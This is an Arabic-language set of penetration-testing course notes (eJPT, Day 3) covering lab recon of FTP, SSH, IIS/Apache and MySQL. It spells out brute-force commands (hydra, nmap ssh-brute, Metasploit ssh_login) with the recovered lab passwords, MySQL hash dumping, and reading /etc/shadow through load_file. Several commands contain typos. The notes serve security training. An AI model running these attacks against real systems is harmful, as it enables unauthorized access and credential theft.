# Session 3 (ejpt) - Day 3
## Assessment Methodologies part 2

طبعا باذن الله راح نكمل محاضرة امس من عند اخر شي وقفنا عنده
وهو بروتوكول FTP
بس باقي لنا لاب واحد من الـ FTP
وراح نشوف اليوم باذن الله البروتوكولات التاليه
SSH , HTTP , SQL
وبعدها راح ندخل على قسم جديد لو سمح لنا الوقت باذن الله


--------------------------------------------------------------------------------------------
راح نبداء باللاب الاول الي هو   
### VSFTPD Recon: Basics


طبعا هذا اللاب نفس فكرة الـ Null session 
في بروتوكول SMB 

طبعا البورت حق بروتوكول FTP - 21

راح تقدر تسجل دخول بيوزر وباسورد معينه تجي by default 

طبعا في هذا اللاب ماعطانا تارقت معين فراح نفحص كامل الشبكة 
[nmap -sV 192.163.181.0/24]

طبعا اختصار للوقت نعرف ان التارقت حقنا في هذا اللاب
[target: 192.163.181.3]

طبعا لان نلاحظ ان الاصدار حق الخدمة vsftpd 3.0.3
طبعا يعتبر فيه misconfigruation
default usernamer: anonymous and the defalut password:فاضي

عشان نتاكد من وجود الثغره او الخطاء هذا بنفذ هذا السكربت
[nmap --script ftp-anon 192.163.181.3]

طبعا الي قاعد يسويه السكربت انه يسجل دخول باليوزر الي فوق ويخلي الباسورد فاضي اذا دخل راح يعطيك الملفات واذا مادخل يعني تم معالجة هذا الخطاء وتم الغاء التسجيل بهذا اليوزر

طبعا اهم امرين نقدر نستخدمخم بعد ماندخل هم الـ get , put
عشان نحمل من السيرفر ونرفع لسيرفر

طبعا فيه ثغرات اخرى راح ناخذها قدام

طبعا دائما هذي البروتوكولات مثل SSH , FTP etc...
نهتم بهذي الاشياء اليوزر والباسورد البروت فورس الخ
--------------------------------------------------------------------------------------------

راح نبداء باللاب الثاني الي هو   
### SSH Recon: Basic



طبعا الـ SSH
هو انك تتصل بسيرفر عن بعد فيعطيك شل عليه 

والبورت حقه هو 22

طبعا في هذا اللاب ماعطانا تارقت معين فراح نفحص كامل الشبكة 
[nmap -sV 192.142.86.0/24]

طبعا اختصار للوقت نعرف ان التارقت حقنا في هذا اللاب
[target: 192.142.86.3]

طبعا طلع لنا الان ان البورت مفتوح وظهر لنا اصدار الخدمة

طبعا عشان تشبك بالـ SSH 
فيه عندك اكثر من طريقه
- SSH utility
- nc utility

طبعا راح نجرب نسجل بيوزر root
هو الي غالبا يكون موجود بس خل نشوف هل عليه باسورد او لا
[ssh root@192.142.86.3]
زي مانشوف طلب مننا باسورد 
الان لازم نسوي brute force
عشان نحصل الباسورد والادوات كثير زي ماشرحنا

طبعا البروتوكول هذا يستخدم اكثر من طريقة لتحقق
- private key
- password

فراح نستخدم سكربت عشان نشوف ايش طريقة التشفير الموجوده
[nmap --script ssh2-enum-algos 192.142.86.3]


طبعا عندنا شي ثاني بنجربه الي هو باللاب معطينا يوزرين
student , admin

طبعا يقول انه فيه يوزر تقدر تسجل فيه بدون باسورد راح نجرب طريقة بسكربت
[nmaps --script shh-auth-methods --script-args="ssh.user=student" 192.142.86.3]
وراح يعطينا هل نقدر نسجل بدون برايفت كي و بدون باسورد او لا ف نجرب نسجل الان لانه قال انه يدعم الـ none_auth
[ssh student@192.142.86.3]
نسوي امر ls
وحصلنا الفلاق الان الاول الي بيوزر student

طبعا لو بغينا نسوي امر معين بنحتاج اول شي اليوزر وهو معطينا اياه من اللاب نفسه
student
طبعا مافيه باسورد فقط اليوزر

فيه هذا السكربت ينفذ لك الاوامر بدون ماتشبك على الـ SSH
[nmap --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG , ssh-run.username=student,ssh-run.password=" 192.142.86.3]
طبعا الان قرانا الملف الي نبيه لكن الاسرع و الافضل انك تسجل دخول باليوزر والباسورد لو مطلوب وتفحص كامل النظام الي داخل عليه 
لانه بالحياة الواقعيه ماراح تعرف وش المسار فالافضل تسجل عن طريق الـ SSH utility
[ssh student@192.142.86.3]
وتقعد تفر على راحتك

--------------------------------------------------------------------------------------------

راح نبداء باللاب الثالث الي هو   
### SSH Recon: Dictionary Attack


هذا طبعا نفس اللاب الي قبل لكن يحتاج نسوي بروت فورس عشان نحصل الباسورد

طبعا في هذا اللاب ماعطانا تارقت معين فراح نفحص كامل الشبكة 
[nmap -sV 192.43.243.0/24]
انتبه راح يتغير الايبي مو نفس الي هنا شيك على اللاب الي عندك عن طريق كتابة امر
[ifconfig]

طبعا اختصار للوقت نعرف ان التارقت حقنا في هذا اللاب
[target: 192.43.243.3]

طبعا اللاب عطانا اليوزر الي هو
student
لكن مطلوب مننا نحصل الباسورد فراح نستخدم التنين hydra
[hydra -l student -P /usr/share/wordlists/rockyou.txt 192.43.243.3 ssh]
لاتنسى تفك الضغط عن الليسته 
[gzip -d /usr/share/wordlists/rockyou.txt]

الان حصلنا الباسورد الي هو
username: student password:friend

الان كل الي علينا نشبك عليه وراح نقدر ندخل بدون مشاكل
طبعا الان فيه طريقة ثانيه الي هي باداة الـ nmap

طبعا موضوع الـ nmap قروشه
لانه مايقبل تعطيه اليوزر كنص عادي تكتبه لابد يكون داخل ملف ف بنسوي هذا الامر
[echo "administrator" > users]
الان صار عندنا ملف اسمه users 
فيه اليوزر administrator

الان راح نشغل السكربت على هذا اليوزر
[nmap -p 22 --script ssh-brute --script-args userdb=/root/users 192.43.243.3]
نلاحظ انه بدا الان وحصلنا الباسورد نحصله تحت طبعا
Accounts: 
    administrator:sunshine - Valid credentials

والان نقدر نتصل سواء باليوزر الاول او الثاني

طبعا اخر فكره انك تسوي بروت فورس عن طريق msfconsole
نفتح الفريم وورك بالامر التالي
[msfconsole]
ونستخدم هذا الموديول
[use auxiliary/scanner/ssh/ssh_login]
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
لابد نعطيه قيم لهذي المتغيرات RHOST , USERPASS_FILE 
طبعا عندنا هذا المتغير الي هو المفروض تكون قيمته اليوزر USERNAME
لكن حنا استخدمنا ووردليست فيها يوزر وباسورد ف مايحتاج نحط القيمه لانه بيسحبها من الووردليست
[set RHOSTS 192.40.231.3]هذا التارقت
[set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt] هذا الليسته حقت الباسوردات
[set STOP_ON_SUCCESS true] طبعا هذا يعني انه اذا نجحت وحصلت الباسورد وقف
[set verbose true] طبعا هذا عشان نشوف كل محاوله وحالتها هل نجحت او لا
[exploit] or [run] عشان نشغل الموديول ويبدا يجرب

فحصلنا اليوزر والباسورد
username: root password:attack

طبعا عطانا session لكن نجيها بعدين مو الحين نشرحها باذن الله
نروح نسجل بالـ SSH 
[ssh root@192.43.243.3]
وزي مانعرف ان الروت اعلى صلاحيات في نظام لينكس نفس يوزر administrator في الويندوز
--------------------------------------------------------------------------------------------

راح نبداء باللاب الرابع الي هو   
### Windows Recon: IIS


طبعا هذا اللاب يتكلم عن بروتوكول HTTP
وانواع موجوده فيه مثل
apache,nginx ,Windows IIS servers

الـ IIS
هو سيرفر للويب ودائما بتحصله على ويندوز مستحيل تحصله على لينكس
لينكس غالبا تحصل اباتشي و انجينكس

طبعا هنا معطينا الايبي الي يبينا نفحصه
[nmap -sV 10.5.30.122]
راح نحصل ان بورت HTTP مفتوح
وشغال عليه Microsoft IIS httpd 10.0
طبعا في اللاب شارح اداة whatweb
طبعا انت اذا كنت تتعامل مع الويب لابد تعرف اهم الاشياء مثل
المسارات المخفيه و نوع السيرفر و نوع الفريم وورك المستخدم

فكرة الاداة نفس اداة wappalyzer 
طبعا wappalyzer 
اكستنشن ويب تضيفه على متصفحك ويعطيك معلومات كثيره تخص الموقع الي انت داخله 
ف انا انصح بهذي الاداةافضل واسرع

طبعا فيه اداة اسمها HTTP
وظيفته يرسل الريكوست ويعطيك الريسبونس على التيرمنال

طبعا فيه اداة اسمها dirb
هذي وظيفتها تعطيها ووردليست وتخمن لكن المسارات بالموقع وتعطيك النتيجة لو كان موجود المسار او لا
[dirb http://10.5.30.122] وراح يستخدم ووردليست من عنده الي هي الديفولت ووردليست

نلاحظ انه عطانا مسارات كثير حاليا و نقدر ندخلها من المتصفح 
او نقدر نستخدم اداة اسمها browsh

وظيفة الاداة غبيه شوي لكن يقولك انه لو ماعندك متصفح تستخدم هذي الاداة لكن ممكن تفيدك في احد السياريوهات لكن هذا الامر عشان تفتحه
[browsh --startup-url http://10.5.30.122/Default.aspx]
الان فتح لنا الصفحة بس تلاحظ كيف كله بكسل مربعات ومو واضح ف الافضل انك تفتح من المتصفح حقك
--------------------------------------------------------------------------------------------

راح نبداء باللاب الخامس الي هو   
### Windows Recon: IIS: Nmap Scripts


طبعا نفس فكرة اللاب السابق لكن بنستخدم سكربتات nmap

فقط الاختلاف بالاداة بيكون بدال مانستخدم
whatweb , HTTP , dirb 
راح نسويها عن طريق سكربتات الـ nmap

طبعا هنا معطينا الايبي الي يبينا نفحصه

بنفحص بالاداة nmap
[nmap -sV 10.6.28.112]

وحصلنا ان بورت HTTP مفتوح
وحصلنا الاصدار
Microsoft IIS httpd 10.0

فيه سكربت وظيفته انه يجيب لك المسارات او مجلدات مهمه 
[nmap --script http-enum -sV 10.6.28.112]
نشوف انه حصلنا ثلاث مجلدات مهمه 

والان السكربت الثاني الي هو http-headers
عشان يجيب لك الهيدرات الموجوده في الريسبونس
ففيه هيدر يوضح لك اصدار السيرفر مثلا يعلمك الكوكي لو كان فيه يطلع لك المسار الخ..
[nmap --scrip http-headers -p 80 10.6.28.112]

وفيه سكربت اخر يطلع لك ايش الميثود الي تقدر تستخدمهم في مسار معين انت تحدده مثل
GET , POST , PUT , DELETE etc..
[nmap --script http-methods --script-args http.methodes.url-path=/webdav/ -p 80 10.6.28.112]
فراح يعطينا الان الميثود حقت المسار الي حددناه الي هو webdav

طبعا فيه سكربت اخر نفس المخرجات لكن مخصص للفريم وورك هذا الي هو webdav
[nmap --script http-webdav-scan --script-args http-methods.url-path=/webdav/
10.6.28.112]
نلاحظ انه نفس المخرجات
--------------------------------------------------------------------------------------------

راح نبداء باللاب السادس الي هو   
### Apache Recon: Basics


طبعا في هذا اللاب راح ناخذ سيرفر الاباتشي Apache
وطبعا يعتبر الاكثر استخدام ومن اهم مميزاته انه مايحدك على نظام تشغيل ميعن نفس الـ IIS
هذا السيرفر تقدر تشغله سواء على ويندوز او لينكس وهو الاكثر استخدام


طبعا هنا معطينا الايبي الي يبينا نفحصه

بنفحص بالاداة nmap
[nmap -sV 192.46.22.3]

طبعا اول شي راح نستخدمه هو سكربت في اداة الـ nmap 
وظيفته يجيب لك اصدار الاباتشي من الهيدر الي في الريسبونس
صحيح انه جاب لنا الاصدار عشان استخدمنا -sV 
لكن فيه هيدر معين لهالشي وهذا هو الامر
[nmap -sV --script banner 192.46.22.3]
ونلاحظ انه عطانا الاصدار
- Apache/2.4.18

وفيه طريقة اخرى عن طريق MSFconsole
[msfconsole] عشان نفتح الفريم وورك
والان نحدد الموديول
[use auxiliary/scanner/http/http_version]
ونشوف ايش المتغيرات المطلوبه عن طريق الامر هذا
[show options]
بعدها نلاحظ انه طالب فقط ايبي التارقت RHOST
[set RHOSTS 192.46.22.3] عشان نحدد له ايبي التارقت
[exploit] or [run] عشان نشغل الموديول
ونلاحظ انه عطانا الاصدار
- Apache/2.4.18

الان بنجرب اداة جديده وهي اداة curl
وهي وظيفتها ترسل الريكوست وتعطينا الرد كامل في التيرمنال او الصفحة الي دخلناها
[curl http://192.46.22.3/]

عندنا اداة ثانيه نفس الاداة السابقه والي هي اسمها wget
الفرق انه يحمل لك الصفحة بدال مايعرضها لك
[ wget “http://192.46.22.3/index”]
نلاحظ انه حملنا الصفحة

طبعا عندنا موديول في الـ MSFconsole
وظيفته نفس اداة dirb
يجيب لك مسارات او مجلدات موجوده في الموقع
[msfconsole] عشان نفتح الفريم وورك
والان نحدد الموديول
[use auxiliary/scanner/http/brute_dirs]
ونشوف ايش المتغيرات المطلوبه عن طريق الامر هذا
[show options]
بعدها نلاحظ انه طالب فقط ايبي التارقت RHOST
[set RHOSTS 192.46.22.3] عشان نحدد له ايبي التارقت
[exploit] or [run] عشان نشغل الموديول
والان نشوف اانه حصلنا مسارات

فيه كذالك موديول ثاني لملف الـ robots.txt
وهذا الملف وظيفته انه يمنع المتصفحات من انها تعرض لك بعض الصفحات في المتصفح
ف راح تحصل فيه مسارات قد تكون مهمه
[msfconsole] عشان نفتح الفريم وورك
والان نحدد الموديول
[use auxiliary/scanner/http/robots_txt]
ونشوف ايش المتغيرات المطلوبه عن طريق الامر هذا
[show options]
بعدها نلاحظ انه طالب فقط ايبي التارقت RHOST
[set RHOSTS 192.46.22.3] عشان نحدد له ايبي التارقت
--------------------------------------------------------------------------------------------

راح نبداء باللاب السابع الي هو   
### MySQL Recon: Basics


طبعا الان بنشوف كيف نقدر نبحث او نجمع معلومات عن خدمة MySQL
وهذي الخدمة معروفه وتخص قواعد البيانات

طبعا في هذا اللاب ماعطانا تارقت معين فراح نفحص كامل الشبكة 
[nmap -sV 192.168.179.0/24]

طبعا اختصار للوقت نعرف ان التارقت حقنا في هذا اللاب
[target: 192.168.179.3]

ف نسوي nmap scam
[nmap -sV 192.168.179.3]

نلاحظ انه البورت 3306 مفتوح والسيرفس او الخدمة الي عليه هي MySQL

طبعا الاصدارات القديمه فيها خطا او misconfigruation 
وهو انه فيه يوزر ديفولت نفس الـ SSH
ف هنا الديفولت يوزر لقاعدة البيانات هذي هو root ويكون بدون باسورد

ف الان كيف نتصل بقاعدة البيانات؟
[mysql -h 192.168.179.3 -u root]

طبعا هنا نستخدم لغة sql عشان نتعامل مع القاعدة ف عندنا بعض الاوامر 
[show databases;] هذا عشان يعرض لنا كل قاعدة البيانات الي بنستخدمها
[use books;] هنا عشان نحدد القاعدة الي نبي نسوي عليها الكويري
[select count(*) from authors;] هنا خليناه يحسب لنا عدد الصفوف من التيبل الي اسمه autors

كذالك عندنا موديول في الـ MSFconsole
وظيفة الموديول هذا انه يحمل لك الداتا بيس او السكيما بشكل اصح
[msfconsole] عشان نفتح الفريم وورك
والان نحدد الموديول
[use auxiliary/scanner/mysql/mysql_schemadump]
ونشوف ايش المتغيرات المطلوبه عن طريق الامر هذا
[show options]
نلاحظ انه طالب مننا RHOST USERNAME PASSWORD
راح نعطيه القيم لهذي المتغيرات
[set RHOSTS 192.168.179.3]
[set USERNAME root]
[set PASSWORD ""]
ونشوف انه طلع لنا كامل الداتا بيس
ايش اسم الداتا بيس الموجوده ايش الكولوم الموجوده داخله الداتا بيس 

طبعا فيه موديول اخر وظيفته يعطيك هل صلاحية الكتابه عندك او لا على المسار الي تحدده تشوف هل عندك صلاحية الكتابه او لا وتقدر تحدد اسم الفايل الي تبيه يكتب فيه لو كان عندك هذي الصلاحية
[msfconsole] عشان نفتح الفريم وورك
والان نحدد الموديول
[use auxiliary/scanner/mysql/mysql_writable_dirs]
ونشوف ايش المتغيرات المطلوبه عن طريق الامر هذا
[show options]
نلاحظ طالب مننا DIR_LIST RHOST PASSWORD
نعطيه القيم لهذي المتغيرات
[set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt]
[set RHOSTS 192.168.179.3]
[set VERBOSE false]طبعا هذا فقط عشان مايعرض لنا التفاصيل ويكون زحمه
[set PASSWORD ""]
[exploit] or [run]

طبعا فيه موديول ثاني بعد يطلع لك الملفات الحساسه مثل /etc/passwd , /etc/shadow etc..
[msfconsole] عشان نفتح الفريم وورك
والان نحدد الموديول
[use auxiliary/scanner/mysql/mysql_file_enum]
ونشوف ايش المتغيرات المطلوبه عن طريق الامر هذا
[show options]
نلاحظ طالب مننا RHOST , FILE_LIST
نعطيه القيم لهذي المتغيرات
[set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt] طبعا لابد تحط الليسته بناء على نظام التشغيل الي تتعامل معه
[set RHOST 192.168.179.3]
[set PASSWORD ""]
[exploit] or [run]

فعطانا كل الملفات الي عندنا عليها صلاحية كتابه
طبعا كيف نقرا الملف عن طريق mysql?
اول شي نسجل دخول
[mysql -h 192.168.179.3 -u root]
بعدها نسوي هذا الامر عشان نقرا الملف
[select load_file("/etc/shadow");]

طبعا عندنا موديول ثاني يجيب لك الهاش حق الـ MySQL وليس حق النظام
[msfconsole] عشان نفتح الفريم وورك
والان نحدد الموديول
[use auxiliary/scanner/mysql/mysql_hashdump]
ونشوف ايش المتغيرات المطلوبه عن طريق الامر هذا
[show options]
نلاحظ طالب مننا RHOST , USERNAME , PASSWORD
نعطيه القيم لهذي المتغيرات
[set RHOSTS 192.168.179.3]
[set USERNAME root]
[set PASSWORD ""]
[exploit] or [run]

الان طلعنا كل الهاشات الموجوده حقت قاعدة البيانات

الان بنجرب سكربت nmap 
وظيفته انه يشوف هل بيقبل ان الروت يكون بدون باسورد وبيدخلني او لا
[nmap --scropt=mysql-empty-password -p 3306 192.168.179.3]

وفيه كذالك سكربت اخر مثل الاصدار و معلومات اخرى
[nmap --script=mysql-into -p 3306 192.168.179.3]

وفيه كذالك سكربت يعطيك اليوزرات 
[nmap --scropt=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.168.179.3]
ونشوف انه عطانا كل اليوزرات الموجوده على mysql

السكربت الي بعده يطلع لك وش الداتا بيس الموجوده
[nmap --scropt=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.168.179.3]

وكذالك فيه سكربت وظيفته يطلع لك المتغيرات حقت قاعدة البيانات 
[nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p
3306 192.168.179.3]

السكربت هذا ماقدرت اشرحه عربي ف جبت لك ريسورس تقرا عن السكربت
طبعا الموقع هو موقع الاداة الرسمي
[https://nmap.org/nsedoc/scripts/mysql-audit.html]

[nmap --script=mysql-audit --script-args
"mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/n
selib/data/mysql-cis.audit'" -p 3306 192.168.179.3]
--------------------------------------------------------------------------------------------

@s4cript | @cyberhub | @@0xNawaF1
